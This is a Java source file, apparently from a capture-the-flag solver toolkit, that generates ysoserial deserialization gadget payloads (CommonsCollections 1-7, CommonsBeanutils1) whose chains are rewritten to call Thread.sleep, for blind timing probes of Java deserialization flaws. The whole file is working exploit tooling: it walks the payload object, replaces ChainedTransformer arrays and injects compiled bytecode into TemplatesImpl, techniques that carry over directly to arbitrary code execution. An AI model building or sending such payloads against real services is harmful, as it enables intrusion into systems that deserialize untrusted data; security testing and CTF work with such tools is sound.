// A ysoserial gadget whose payload SLEEPS instead of running a command (for the blind timing probe of
// solvers/toolkits/java_deser.py). Runtime.exec() returns at once, so a `sleep N` command never delays the
// response that deserialized it; Thread.sleep(ms) inside the chain does.
//
// Built by tools/setup_ysoserial.sh (javac --release 8 against the pinned ysoserial-all.jar) and run only in
// the temurin 8 container (--network none) by `java_deser.py regen`, which writes the sleep templates. The
// payload object is ysoserial's own; this file only swaps what the chain calls, after it is built:
//   - every commons-collections 3 ChainedTransformer gets Thread.class -> getMethod("sleep", long) ->
//     invoke(null, ms) (CommonsCollections1, 5, 6, 7; 3's chain too);
//   - every TemplatesImpl gets, as its _bytecodes[0], ysoserial's StubTransletPayload with
//     `java.lang.Thread.sleep(<ms>L);` as its static initializer (CommonsBeanutils1, CommonsCollections2, 4),
//     under the fixed class name ysoserial.CsctfSleepPayload so the output is reproducible.
// Nothing is deserialized here, so nothing sleeps here.
//
// usage: java -cp ysoserial-all.jar:classes CsctfSleep <gadget> <milliseconds>

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Collections;
import java.util.IdentityHashMap;
import java.util.Set;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

public class CsctfSleep {
    static final String TEMPLATES = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    static final String TRANSLET = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
    static final String STUB = "ysoserial.payloads.util.Gadgets$StubTransletPayload";

    static int changed = 0;

    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.err.println("usage: CsctfSleep <gadget> <milliseconds>");
            System.exit(2);
        }
        long ms = Long.parseLong(args[1]);
        Class<? extends ObjectPayload> c = ObjectPayload.Utils.getPayloadClass(args[0]);
        if (c == null) {
            System.err.println("no such gadget: " + args[0]);
            System.exit(2);
        }
        Object obj = c.newInstance().getObject("csctf-sleep-unused");
        Set<Object> seen = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>());
        walk(obj, ms, seen);
        if (changed == 0) {
            System.err.println("no ChainedTransformer or TemplatesImpl in " + args[0]);
            System.exit(3);
        }
        Serializer.serialize(obj, System.out);
        System.out.flush();
    }

    static Transformer[] chain(long ms) {
        return new Transformer[] {
            new ConstantTransformer(Thread.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class},
                                   new Object[] {"sleep", new Class[] {long.class}}),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class},
                                   new Object[] {null, new Object[] {Long.valueOf(ms)}}),
            new ConstantTransformer(1)};
    }

    static byte[] sleepClass(long ms) throws Exception {
        ClassPool pool = new ClassPool(true);
        pool.insertClassPath(new ClassClassPath(Class.forName(STUB)));
        pool.insertClassPath(new ClassClassPath(Class.forName(TRANSLET)));
        CtClass clazz = pool.get(STUB);
        clazz.makeClassInitializer().insertAfter("java.lang.Thread.sleep(" + ms + "L);");
        clazz.setName("ysoserial.CsctfSleepPayload");
        clazz.setSuperclass(pool.get(TRANSLET));
        return clazz.toBytecode();
    }

    static void set(Object o, String name, Object value) throws Exception {
        for (Class<?> k = o.getClass(); k != null; k = k.getSuperclass()) {
            try {
                Field f = k.getDeclaredField(name);
                f.setAccessible(true);
                f.set(o, value);
                return;
            } catch (NoSuchFieldException e) {
                // the next superclass
            }
        }
        throw new NoSuchFieldException(name);
    }

    static Object get(Object o, String name) throws Exception {
        for (Class<?> k = o.getClass(); k != null; k = k.getSuperclass()) {
            try {
                Field f = k.getDeclaredField(name);
                f.setAccessible(true);
                return f.get(o);
            } catch (NoSuchFieldException e) {
                // the next superclass
            }
        }
        throw new NoSuchFieldException(name);
    }

    static void walk(Object o, long ms, Set<Object> seen) throws Exception {
        if (o == null || seen.contains(o)) return;
        Class<?> k = o.getClass();
        if (k.isPrimitive() || o instanceof Class || o instanceof String || o instanceof Number
                || o instanceof ClassLoader || o instanceof Thread) return;
        seen.add(o);
        if (o instanceof ChainedTransformer) {
            set(o, "iTransformers", chain(ms));
            changed++;
            return;
        }
        if (TEMPLATES.equals(k.getName())) {
            byte[][] codes = (byte[][]) get(o, "_bytecodes");
            codes[0] = sleepClass(ms);
            changed++;
            return;
        }
        if (k.isArray()) {
            if (k.getComponentType().isPrimitive()) return;
            for (int i = 0; i < Array.getLength(o); i++) walk(Array.get(o, i), ms, seen);
            return;
        }
        for (Class<?> c = k; c != null && c != Object.class; c = c.getSuperclass()) {
            for (Field f : c.getDeclaredFields()) {
                if (Modifier.isStatic(f.getModifiers()) || f.getType().isPrimitive()) continue;
                f.setAccessible(true);
                walk(f.get(o), ms, seen);
            }
        }
    }
}
